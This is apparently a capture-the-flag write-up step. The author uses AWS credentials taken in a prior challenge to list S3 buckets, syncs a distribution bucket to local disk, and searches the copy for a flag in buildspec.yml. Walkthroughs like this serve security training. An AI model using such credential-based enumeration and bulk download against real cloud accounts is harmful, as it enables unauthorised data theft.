# 08 - Building the perfect crime

Using the credentials I obtained from [07 - Knowing who you are](), I ran `aws s3 ls`:

```console
$ aws s3 ls
2021-11-15 18:23:52 carousel-app-appbucketscloudtrailbackupbucket045b-1572bcos4y7hp
2021-11-15 18:23:52 carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4
2021-11-15 18:23:51 carousel-app-appbucketssourceimagesbucketcbdfb98c-1weh10b2l2p4m
2021-11-15 18:23:52 carousel-app-appbucketswatermarkedimagesbucketfce-1tojqzrov3x1u
2021-11-15 18:23:52 carousel-app-loggercloudtrailbucketdb8d265f-1vop1e3ptx79f
2021-10-07 10:32:07 cdktoolkit-stagingbucket-v07mau7pk87y
```

Score!

```console
$ aws s3 ls s3://carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4
                           PRE client/
                           PRE decryptor/
2021-11-15 18:36:58         15 .gitignore
2021-11-15 18:36:58      91212 Diagram.png
2021-11-15 18:36:58        241 Pipfile
2021-11-15 18:36:58      13870 Pipfile.lock
2021-11-15 18:36:58        719 README.md
2021-11-15 18:36:58       2195 buildspec.yml
2021-11-15 18:37:03         60 requirements.txt
2021-11-15 18:37:03       1524 vetur.config.js
2021-11-15 18:37:03       2404 watermark.py
```

I dumped the site and then searched for the next flag using [`ripgrep`](https://github.com/BurntSushi/ripgrep):

```console
$ aws s3 sync s3://carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4 ./carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4
$ rg HF- carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4
carousel-app-appbucketsdistributionbucketc2fc3d59-crwx56j46vs4/buildspec.yml
17:# FLAG8: HF-kr6EHrYfnN4ZbRXCVQfYZe8YNjtPGRN4
```

🚩
